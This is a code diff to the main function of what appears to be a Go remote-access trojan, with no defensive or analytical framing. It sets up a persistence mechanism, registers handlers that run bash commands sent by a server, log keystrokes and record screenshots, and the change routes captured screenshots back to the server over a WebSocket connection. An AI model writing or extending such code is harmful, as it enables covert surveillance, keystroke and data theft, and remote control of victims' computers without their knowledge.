@@ -11,15 +11,6 @@ func main() {
 	// folder strcuture & persist mechanism
 	internal.Deploy()
 
-	// Initialize Observer for processing incoming
-	// commands from server
-	screenrecorder := internal.NewScreenRecorder(5)
-
-	subject := &internal.Subject{}
-	subject.AddListener(internal.NewBashExecutorObserver())
-	subject.AddListener(internal.NewKeyloggerCmdObserver())
-	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder))
-
 	// ===========================================================================
 	// Start connection and communication with server
 	// Subject with Observers is passed as parameter
@@ -31,6 +22,17 @@ func main() {
 
 	// Creates WSClient
 	wsc := internal.NewWSClient(wscconf, httpconf)
+
+	// Initialize Observer for processing incoming
+	// commands from server
+	screenrecorder := internal.NewScreenRecorder(5)
+
+	subject := &internal.Subject{}
+	subject.AddListener(internal.NewBashExecutorObserver())
+	subject.AddListener(internal.NewKeyloggerCmdObserver())
+	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, internal.NewSendFileCommand(wsc)))
+
+	// Start Communications
 	wsc.StartCommunications(subject)
 
 }
